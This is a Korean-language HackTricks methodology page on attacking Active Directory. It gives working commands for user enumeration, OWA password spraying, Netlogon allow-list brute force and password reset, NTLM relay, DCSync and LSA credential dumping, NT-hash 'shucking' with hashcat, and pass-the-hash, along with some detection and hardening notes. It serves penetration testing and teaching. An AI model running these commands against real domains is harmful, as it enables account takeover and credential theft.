# Active Directory 방법론

{{#include ../../banners/hacktricks-training.md}}

## 기본 개요

**Active Directory**는 **네트워크 관리자**가 네트워크 내에서 **도메인**, **사용자**, **개체**를 효율적으로 생성하고 관리할 수 있도록 지원하는 기반 기술입니다. 확장성을 고려해 설계되어, 많은 사용자를 관리하기 쉬운 **그룹**과 **하위 그룹**으로 구성하고 여러 수준에서 **접근 권한**을 제어할 수 있습니다.

**Active Directory** 구조는 기본적으로 **도메인**, **트리**, **포리스트**의 세 가지 계층으로 구성됩니다. **도메인**은 공통 데이터베이스를 공유하는 **사용자**나 **장치** 등의 개체 모음입니다. **트리**는 공통 구조로 연결된 도메인 그룹이며, **포리스트**는 **신뢰 관계**로 서로 연결된 여러 트리의 모음으로, 조직 구조의 최상위 계층을 형성합니다. 각 계층에서 특정 **접근 권한**과 **통신 권한**을 지정할 수 있습니다.

**Active Directory**의 주요 개념은 다음과 같습니다.

1. **디렉터리** – Active Directory 개체에 관한 모든 정보를 저장합니다.
2. **개체** – 디렉터리 내의 **사용자**, **그룹**, **공유 폴더** 등의 엔터티를 나타냅니다.
3. **도메인** – 디렉터리 개체를 담는 컨테이너입니다. 하나의 **포리스트**에 여러 도메인이 존재할 수 있으며, 각 도메인은 자체 개체 모음을 유지합니다.
4. **트리** – 공통 루트 도메인을 공유하는 도메인 그룹입니다.
5. **포리스트** – Active Directory 조직 구조의 최상위 단위로, 여러 트리와 트리 간의 **신뢰 관계**로 구성됩니다.

**Active Directory Domain Services(AD DS)**는 네트워크 내 중앙 집중식 관리와 통신에 필수적인 여러 서비스를 포함합니다. 이러한 서비스는 다음과 같습니다.

1. **도메인 서비스** – 데이터를 중앙 집중식으로 저장하고 **사용자**와 **도메인** 간의 상호 작용을 관리하며, **인증** 및 **검색** 기능을 제공합니다.
2. **인증서 서비스** – 보안 **디지털 인증서**의 생성, 배포 및 관리를 담당합니다.
3. **Lightweight Directory Services** – **LDAP 프로토콜**을 통해 디렉터리 기반 애플리케이션을 지원합니다.
4. **Directory Federation Services** – 단일 세션에서 여러 웹 애플리케이션에 걸쳐 사용자를 인증하는 **single-sign-on** 기능을 제공합니다.
5. **권한 관리** – 저작권이 있는 자료의 무단 배포와 사용을 통제해 보호합니다.
6. **DNS 서비스** – **도메인 이름**을 확인하는 데 필수적입니다.

자세한 설명은 [**TechTerms - Active Directory 정의**](https://techterms.com/definition/active_directory)를 확인하세요.

### **Kerberos 인증**

**AD를 공격**하려면 **Kerberos 인증 프로세스**를 잘 **이해**해야 합니다.\
[**작동 방식을 아직 모른다면 이 페이지를 읽어보세요.**](kerberos-authentication.md)

## 치트 시트

[https://wadcoms.github.io/](https://wadcoms.github.io)에서 AD를 열거하거나 exploit할 때 실행할 수 있는 명령을 빠르게 확인할 수 있습니다.

> [!WARNING]
> Kerberos 통신은 일반적으로 클라이언트가 올바른 SPN에 대한 티켓을 받을 수 있도록 **정규화된 도메인 이름(FQDN)**이 필요합니다. IP 주소로 시스템에 접근하면 Kerberos 대신 NTLM으로 대체되는 경우가 많습니다.

## Active Directory 정찰 (자격 증명/세션 없음)

AD 환경에 접근할 수 있지만 자격 증명이나 세션이 없다면 다음을 수행할 수 있습니다.

- **네트워크 pentest:**
  - 네트워크를 스캔하고 시스템과 열려 있는 포트를 찾은 다음, **취약점을 exploit**하거나 해당 시스템에서 **자격 증명을 추출**해 보세요(예: [프린터는 매우 흥미로운 공격 대상일 수 있습니다](ad-information-in-printers.md)).
  - DNS 열거를 통해 웹 서버, 프린터, 공유 폴더, VPN, 미디어 등의 도메인 내 주요 서버에 대한 정보를 얻을 수 있습니다.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - 이 작업을 수행하는 방법에 대한 자세한 내용은 일반 [**Pentesting 방법론**](../../generic-methodologies-and-resources/pentesting-methodology.md)을 참고하세요.
- **SMB 서비스의 null 및 Guest 접근 확인** (최신 Windows 버전에서는 작동하지 않습니다):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - SMB 서버를 열거하는 자세한 방법은 여기에서 확인할 수 있습니다.


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **LDAP 열거**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - LDAP를 열거하는 자세한 방법은 여기에서 확인할 수 있습니다(**익명 접근**에 특히 주의하세요).


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **네트워크 poisoning**
  - [**Responder로 서비스를 가장해**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) 자격 증명 수집
  - [**relay attack을 악용해**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) 호스트에 접근
  - [**evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)로 가짜 UPnP 서비스를 **노출**해 자격 증명 수집
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - 내부 문서, 소셜 미디어, 도메인 환경 내 서비스(주로 웹), 공개된 정보에서 사용자 이름과 이름을 추출합니다.
  - 회사 직원의 전체 이름을 알아냈다면 다양한 AD **사용자 이름 규칙**을 시도해 볼 수 있습니다(**[여기에서 읽어보세요](https://activedirectorypro.com/active-directory-user-naming-convention/)**). 가장 일반적인 규칙은 _이름성_, _이름.성_, _이름첫세글자성첫세글자_, _이름첫세글자.성첫세글자_, _이름첫글자성_, _이름첫글자.성_, _성_이름_, _성.이름_, _성_이름첫글자_, _성.이름첫글자_, _무작위 문자 3개와 무작위 숫자 3개_ (abc123)입니다.
  - 도구:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### 사용자 열거

- **익명 SMB/LDAP 열거:** [**SMB pentesting**](../../network-services-pentesting/pentesting-smb/index.html) 및 [**LDAP pentesting**](../../network-services-pentesting/pentesting-ldap.md) 페이지를 확인하세요.
- **Kerbrute 열거**: **잘못된 사용자 이름을 요청하면** 서버는 _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ **Kerberos 오류** 코드를 반환하므로 사용자 이름이 유효하지 않음을 알 수 있습니다. **유효한 사용자 이름**을 사용하면 **AS-REP의 TGT** 응답 또는 _KRB5KDC_ERR_PREAUTH_REQUIRED_ 오류가 반환됩니다. 후자는 사용자가 사전 인증을 수행해야 함을 나타냅니다.
- **MS-NRPC에 대한 인증 없음**: 도메인 컨트롤러의 MS-NRPC(Netlogon) 인터페이스에 auth-level = 1(인증 없음)을 사용합니다. 이 방법은 MS-NRPC 인터페이스에 바인딩한 뒤 `DsrGetDcNameEx2` 함수를 호출하여 자격 증명 없이 사용자 또는 컴퓨터의 존재 여부를 확인합니다. [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) 도구는 이러한 유형의 열거를 구현합니다. 자세한 내용은 [여기](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>에서 확인할 수 있습니다.

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) Server**

네트워크에서 이러한 서버 중 하나를 찾았다면, 해당 서버를 대상으로 **사용자 열거**도 수행할 수 있습니다. 예를 들어 [**MailSniper**](https://github.com/dafthack/MailSniper) 도구를 사용할 수 있습니다:

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> 사용자 이름 목록은 [**이 github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)와 이 저장소([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames))에서 찾을 수 있습니다.
>
> 하지만 그전에 수행했어야 할 recon 단계에서 **회사에서 일하는 사람들의 이름**을 확보했어야 합니다. 이름과 성을 사용해 [**namemash.py**](https://gist.github.com/superkojiman/11076951) 스크립트로 유효할 가능성이 있는 사용자 이름을 생성할 수 있습니다.

### Netlogon 취약 채널 allow-list 악용 (Onelogon)

DC에 **Zerologon** 패치를 적용한 후에도 명시적으로 allow-list에 포함된 계정은 **레거시/취약한 Netlogon 보안 채널 동작**에 여전히 노출될 수 있습니다. 위험한 구성은 GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** 또는 이에 대응하는 레지스트리 값 **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**입니다.

해당 값은 **SDDL 보안 설명자**입니다([Security Descriptors](security-descriptors.md) 참조). DACL에서 관련 ACE를 부여받은 계정이나 그룹은 공격 대상이 될 수 있습니다. 예를 들어 `O:BAG:BAD:(A;;RC;;;WD)`는 사실상 **Everyone**을 allow-list에 포함합니다.

실제 작업 절차:

1. **SYSVOL/GPO**와 **실행 중인 DC의 레지스트리**를 모두 확인해 allow-list에 포함된 보안 주체를 **식별합니다**.
2. SDDL에서 발견한 SID를 실제 AD 사용자/컴퓨터로 **확인하고**, **DC 컴퓨터 계정**, **트러스트 계정**, 기타 권한이 높은 컴퓨터를 우선적으로 살펴봅니다.
3. allow-list에 포함된 계정으로 **MS-NRPC / Netlogon 인증**을 반복해서 시도합니다.
4. 추측에 성공한 뒤 **Netlogon 암호 설정**을 악용해 대상 계정의 암호를 재설정합니다(공개 PoC는 암호를 빈 문자열로 설정합니다).<sup>[[9]](#references)[[10]](#references)</sup>

공개 아티팩트의 간단한 triage / lab 예시:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

메모:

- **scanner**가 유용한 이유는 유효한 allow-list가 **SYSVOL**, **registry** 또는 두 곳 모두에 있을 수 있기 때문입니다.
- 취약한 계정이 확인된 뒤에는 **Domain Admin 권한이 없어도** exploit 경로를 진행할 수 있으므로, 경로 자체가 중요합니다.
- `DC$`와 같은 **Domain Controller machine account**를 침해하는 것은 특히 위험합니다. 해당 계정의 password를 재설정하면 더 광범위한 **AD takeover** 경로가 직접 열릴 수 있습니다.
- **Brute-force 가능성**은 모드에 따라 달라집니다. 공개된 artifact에는 meet-in-the-middle 방식, 다른 computer account를 이용한 **24-bit** brute force, 그리고 더 느린 **32-bit** 방식이 설명되어 있습니다.

탐지 / hardening 메모:

- allow-list 정책을 감사하고, 임시로 명시적으로 필요한 호환성 예외 외에는 모두 제거합니다.
- DC의 **System** 이벤트 **5827/5828/5829/5830/5831**을 모니터링하여 취약한 Netlogon 연결이 거부되거나, 발견되거나, 정책에 따라 명시적으로 허용되는지 확인합니다.
- `VulnerableChannelAllowList`의 계정은 legacy 의존성을 제거할 때까지 **고위험**으로 취급합니다.

### 하나 이상의 username을 알고 있는 경우

좋습니다. 유효한 username은 이미 알고 있지만 password는 모르는 상황이라면 다음을 시도해 보세요.

- [**ASREPRoast**](asreproast.md): 사용자에게 _DONT_REQ_PREAUTH_ attribute가 **없는 경우**, 해당 사용자의 **AS_REP message를 요청**할 수 있습니다. 이 메시지에는 사용자 password에서 파생된 값으로 암호화된 데이터가 포함됩니다.
- [**Password Spraying**](password-spraying.md): 발견된 사용자마다 가장 **흔한 password**를 시도해 보세요. 어쩌면 취약한 password를 사용하는 사용자가 있을 수 있습니다(password policy를 염두에 두세요!).
  - OWA servers에 **spray**를 시도하여 사용자의 mail servers에 접근할 수도 있습니다.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

**network**의 일부 protocol을 **poisoning**하여 crack할 수 있는 challenge **hashes**를 **얻을** 수도 있습니다.


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory enumeration을 통해 username, email 식별자와 naming pattern, 후보 host, 그리고 인증을 유도할 수 있는 service를 파악할 수 있습니다. 이 정보를 바탕으로 실행 가능한 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)와 AD 환경으로 이어질 수 있는 잠재적 경로를 식별하세요.

### NetExec workspace 기반 recon 및 relay 상태 점검

- **`nxcdb` workspaces**를 사용해 engagement별 AD recon 상태를 관리하세요. `workspace create <name>`은 `~/.nxc/workspaces/<name>` 아래에 protocol별 SQLite DB(smb/mssql/winrm/ldap 등)를 생성합니다. `proto smb|mssql|winrm`으로 보기를 전환하고 `creds`로 수집된 secret을 확인하세요. 작업이 끝나면 민감한 데이터를 직접 삭제하세요: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- **`netexec smb <cidr>`**로 빠르게 subnet을 탐색하면 **domain**, **OS build**, **SMB signing 요구 사항**, **Null Auth**를 확인할 수 있습니다. `(signing:False)`로 표시된 member는 **relay 취약 가능성이 높고**, DC는 대체로 signing을 요구합니다.
- NetExec 출력에서 바로 **/etc/hosts의 hostname**을 생성해 target 지정에 활용하세요:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- **SMB relay to the DC가 signing으로 차단된 경우에도** **LDAP** 보안 상태를 확인하세요. `netexec ldap <dc>`는 `(signing:None)` 또는 취약한 channel binding을 표시합니다. SMB signing이 필수지만 LDAP signing이 비활성화된 DC는 **SPN-less RBCD**와 같은 악용을 위한 유효한 **relay-to-LDAP** 대상입니다.

### 클라이언트 측 프린터 credential 유출 → 도메인 credential 대량 검증

- 프린터/웹 UI에는 **마스킹된 관리자 비밀번호가 HTML에 포함**되어 있는 경우가 있습니다. 소스/devtools를 확인하면 평문을 찾을 수 있어(예: `<input value="<password>">`) Basic-auth로 스캔/인쇄 저장소에 접근할 수 있습니다.
- 검색한 인쇄 작업에는 사용자별 비밀번호가 포함된 **평문 온보딩 문서**가 있을 수 있습니다. 테스트할 때는 계정과 비밀번호의 짝을 맞춰 유지하세요:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### NTLM 자격 증명 탈취

**null 또는 guest user**로 **다른 PC나 공유에 액세스**할 수 있다면, **파일**(예: SCF 파일)을 **배치**할 수 있습니다. 누군가 해당 파일에 액세스하면 **사용자에게 NTLM 인증을 트리거**하여 **NTLM challenge**를 **탈취**할 수 있습니다:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking**은 이미 보유한 모든 NT hash를 NT hash에서 직접 키 자료를 파생하는, 더 느린 형식에 대한 후보 비밀번호로 취급합니다. Kerberos RC4 티켓, NetNTLM challenge 또는 캐시된 자격 증명을 대상으로 긴 암호 구문을 brute-force하는 대신, NT hash를 Hashcat의 NT-candidate 모드에 입력해 평문을 알아내지 않고도 비밀번호 재사용 여부를 검증할 수 있습니다. 도메인을 침해한 뒤 현재 및 과거 NT hash를 수천 개 수집할 수 있는 경우 특히 효과적입니다.<sup>[[5]](#references)</sup>

다음과 같은 경우 shucking을 사용하세요.

- DCSync, SAM/SECURITY 덤프 또는 자격 증명 vault에서 NT hash 모음을 확보했으며 다른 도메인/forest에서 재사용 여부를 확인해야 하는 경우.
- RC4 기반 Kerberos 자료(`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM 응답 또는 DCC/DCC2 blob을 캡처한 경우.
- 해독할 수 없을 정도로 긴 암호 구문의 재사용을 빠르게 입증하고 즉시 Pass-the-Hash로 피벗하려는 경우.

이 기법은 키가 NT hash가 아닌 암호화 유형(예: Kerberos etype 17/18 AES)에는 **통하지 않습니다**. 도메인에서 AES만 허용한다면 일반 비밀번호 모드로 되돌아가야 합니다.

#### NT hash 모음 만들기

- **DCSync/NTDS** – `secretsdump.py`를 history 옵션과 함께 사용해 가능한 한 많은 NT hash와 이전 값을 수집합니다.

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  History 항목은 후보 풀을 크게 확장합니다. Microsoft는 계정당 이전 해시를 최대 24개까지 저장할 수 있습니다. NTDS secrets를 수집하는 다른 방법은 다음을 참조하세요.

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache 덤프** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (또는 Mimikatz `lsadump::sam /patch`)를 사용하면 로컬 SAM/SECURITY 데이터와 캐시된 도메인 로그온 정보(DCC/DCC2)를 추출할 수 있습니다. 중복을 제거한 뒤 해당 해시를 같은 `nt_candidates.txt` 목록에 추가하세요.
- **메타데이터 추적** – 각 해시를 생성한 username/domain을 기록하세요(wordlist에 hex만 포함되어 있더라도). Hashcat이 성공한 후보를 출력할 때 일치하는 해시를 보면 어떤 principal이 비밀번호를 재사용하는지 즉시 알 수 있습니다.
- 동일한 forest 또는 신뢰된 forest의 후보를 우선 사용하세요. 그러면 shucking 중에 겹치는 항목을 찾을 가능성이 커집니다.

#### Hashcat NT-candidate 모드

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

참고:

- NT-candidate 입력은 **변환되지 않은 32자리 16진수 NT 해시여야 합니다**. 후보 key material이 손상되므로 rule engine을 비활성화하세요(`-r` 사용 금지, hybrid mode 사용 금지).
- 이 모드가 본질적으로 더 빠른 것은 아니지만, NTLM keyspace(~30,000 MH/s on an M3 Max)는 Kerberos RC4(~300 MH/s)보다 약 100배 빠릅니다. 선별한 NT 목록을 테스트하는 편이 느린 형식에서 전체 비밀번호 공간을 탐색하는 것보다 훨씬 저렴합니다.
- 항상 **최신 Hashcat 빌드**를 사용하세요(`git clone https://github.com/hashcat/hashcat && make install`). 모드 31500/31600/35300/35400은 최근에 추가되었습니다.<sup>[[7]](#references)</sup>
- 현재 AS-REQ Pre-Auth용 NT 모드는 없으며, AES etype(19600/19700)는 raw NT 해시가 아니라 UTF-16LE 비밀번호에서 PBKDF2를 통해 키를 파생하므로 평문 비밀번호가 필요합니다.

#### 예시 – Kerberoast RC4 (mode 35300)

1. 권한이 낮은 사용자로 대상 SPN의 RC4 TGS를 캡처합니다(자세한 내용은 Kerberoast 페이지 참조).

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. NT 목록으로 티켓을 shuck하세요:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat은 각 NT 후보에서 RC4 키를 도출하고 `$krb5tgs$23$...` blob을 검증합니다. 일치하면 해당 서비스 계정이 기존 NT hash 중 하나를 사용한다는 뜻입니다.

3. 즉시 PtH로 피벗합니다:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### 예시 – 캐시된 자격 증명 (mode 31600)

1. 침해된 워크스테이션에서 캐시된 로그온 정보를 Dump합니다:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. 관심 있는 도메인 사용자의 DCC2 라인을 `dcc2_highpriv.txt`에 복사한 뒤 shuck합니다:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. 성공적으로 일치하면 목록에 이미 있는 NT hash가 반환되며, 이는 캐시된 사용자가 같은 password를 재사용하고 있음을 증명합니다. 이를 PtH에 바로 사용하거나(`nxc smb <dc_ip> -u highpriv -H <hash>`), 빠른 NTLM 모드로 brute-force하여 password 문자열을 알아낼 수 있습니다.

NetNTLM challenge-response(`-m 27000/27100`)와 DCC(`-m 31500`)에도 같은 작업 흐름을 적용할 수 있습니다. 일치 항목을 찾으면 relay, SMB/WMI/WinRM PtH를 시작하거나, mask/rule을 사용해 오프라인에서 NT hash를 다시 크랙할 수 있습니다.



## 자격 증명/세션을 사용한 Active Directory 열거

이 단계를 진행하려면 **유효한 도메인 계정의 자격 증명이나 세션을 확보해야 합니다.** 유효한 자격 증명이나 도메인 사용자 권한의 shell이 있다면, **앞서 제시한 방법으로 다른 사용자의 계정도 침해할 수 있다는 점을 기억해야 합니다.**

인증된 열거를 시작하기 전에 **Kerberos double-hop 문제**를 이해해야 합니다.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### 열거

계정을 침해하는 것은 **도메인 평가를 위한 중요한 진전**입니다. 인증된 **Active Directory 열거**가 가능해지기 때문입니다.

[**ASREPRoast**](asreproast.md)와 관련해서는 취약할 가능성이 있는 모든 사용자를 찾을 수 있습니다. [**Password Spraying**](password-spraying.md)과 관련해서는 **모든 사용자 이름 목록**을 얻고, 침해한 계정의 password와 빈 password, 새로 발견한 유력한 password를 시도할 수 있습니다.

- [**기본 recon을 수행하는 CMD**](../basic-cmd-for-pentesters.md#domain-info)를 사용할 수 있습니다.
- [**recon을 위한 powershell**](../basic-powershell-for-pentesters/index.html)도 사용할 수 있으며, 이 방법이 더 은밀합니다.
- [**powerview 사용**](../basic-powershell-for-pentesters/powerview.md)으로 더 자세한 정보를 추출할 수도 있습니다.
- Active Directory recon을 위한 또 다른 훌륭한 도구는 [**BloodHound**](bloodhound.md)입니다. (사용하는 수집 방식에 따라) **그다지 은밀하지는 않지만**, **은밀성이 중요하지 않다면** 꼭 사용해 보세요. 사용자가 RDP할 수 있는 위치를 찾고, 다른 그룹으로 이어지는 경로 등을 확인할 수 있습니다.
  - **그 밖의 자동화된 AD 열거 도구:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- 흥미로운 정보가 들어 있을 수 있는 [**AD의 DNS 레코드**](ad-dns-records.md)를 확인합니다.
- GUI를 사용하는 디렉터리 열거 도구로 **SysInternal** Suite의 **AdExplorer.exe**를 사용할 수 있습니다.
- **ldapsearch**로 LDAP 데이터베이스를 검색해 _userPassword_ 및 _unixUserPassword_ 필드에서 자격 증명을 찾거나, 사용자 _description_ 및 _info_ 메모를 확인할 수도 있습니다. _info_에 레이블 없이 password처럼 보이는 값이 있어도 후보일 뿐입니다. 용도와 유효성은 별도로 확인하고, 일반적인 열거 출력에 메모 내용을 포함하지 마세요. 다른 방법은 [PayloadsAllTheThings의 AD User comment에 있는 Password](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment)를 참조하세요.
- 권한이 허용되는 경우 `\\<dc>\NETLOGON` 또는 `\\<dc>\SYSVOL\<domain>\scripts` 아래의 **접근 가능한** 도메인 로그온 및 드라이브 매핑 스크립트를 검토합니다. [Microsoft 문서](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller)에서는 NETLOGON 공유의 스크립트 디렉터리 역할을 설명합니다. 먼저 이름을 나열한 다음, 크기 제한을 두고 관련성이 있으며 읽을 수 있는 스크립트만 살펴보세요. 일반적인 열거 과정에서 공유 전체를 덤프하거나 자격 증명 값을 출력하지 마세요. [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring)를 호출해도 스크립트에 저장된 평문 password는 **보호되지 않습니다**. 이 호출만으로 secret이 하드코딩되었다고 단정할 수는 없습니다. 실제 입력값을 추적한 다음 계정, 자격 증명의 유효성, 권한을 각각 별도로 확인하세요. 도메인 스크립트 검토는 원격 공유 검토이며, 로컬 호스트 열거와는 별개입니다.
- **Linux**를 사용한다면 [**pywerview**](https://github.com/the-useless-one/pywerview)로 도메인을 열거할 수도 있습니다.
- 다음과 같은 자동화 도구도 사용해 볼 수 있습니다.
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **모든 도메인 사용자 추출**

  Windows에서는 도메인 사용자 이름을 모두 쉽게 얻을 수 있습니다(`net user /domain` ,`Get-DomainUser` 또는 `wmic useraccount get name,sid`). Linux에서는 다음을 사용할 수 있습니다. `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` 또는 `enum4linux -a -u "user" -p "password" <DC IP>`

> 이 열거 섹션이 짧아 보여도 전체 과정에서 가장 중요한 부분입니다. 링크(특히 cmd, powershell, powerview, BloodHound 관련 링크)를 확인하고, 도메인 열거 방법을 익혀 익숙해질 때까지 연습하세요. 평가 과정에서 이 단계는 DA로 가는 경로를 찾거나 더 이상 할 수 있는 일이 없다고 판단하는 중요한 순간입니다.

### 예측 가능한 사전 생성 컴퓨터 계정 -> gMSA password 접근

레거시 도메인 가입을 위해 미리 생성해 둔 컴퓨터 계정은 예측 가능한 초기 password를 유지할 수 있습니다. NetExec의 `pre2k` 모듈은 특징적인 `userAccountControl` 값 `4128`(`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`)을 찾아, 컴퓨터 이름의 소문자 표기에서 뒤에 오는 `$`를 제외한 첫 14자를 사용해 Kerberos TGT를 요청합니다. 이 UAC 값을 후보를 선별하는 기준으로 사용하고, **Pre-Windows 2000 Compatible Access** 그룹에 속한다는 이유만으로 password가 약하다고 단정하지 마세요.<sup>[[18]](#references)[[20]](#references)</sup>

인증된 LDAP 열거를 사용해 후보를 테스트하고 성공한 TGT를 저장합니다. `ALL=True`를 사용하면 기본 `4128` 필터에 해당하는 객체 외에도 테스트 범위가 확장됩니다.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

기본/NTLM bind가 실패했다고 해서 이 finding이 무효가 되는 것은 아닙니다. `-k`, DC로 확인되는 FQDN, 그리고 KDC와 동기화된 시계를 사용해 테스트하세요. 성공한 모듈 실행은 후보 목록과 획득한 ccache를 `~/.nxc/modules/pre2k/` 아래에 기록합니다.<sup>[[18]](#references)[[20]](#references)</sup>

컴퓨터 principal을 침해한 후에는 중첩된 그룹 멤버십과 아웃바운드 권한을 그래프로 확인하세요. 특히 gMSA의 `msDS-GroupMSAMembership` 보안 설명자에 명시된 principal은 `msDS-ManagedPassword`를 읽을 수 있습니다. NetExec의 `--gmsa` 출력에는 허용된 principal이 표시되며, 인증하는 컴퓨터에 권한이 있으면 현재 NT hash가 반환됩니다.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

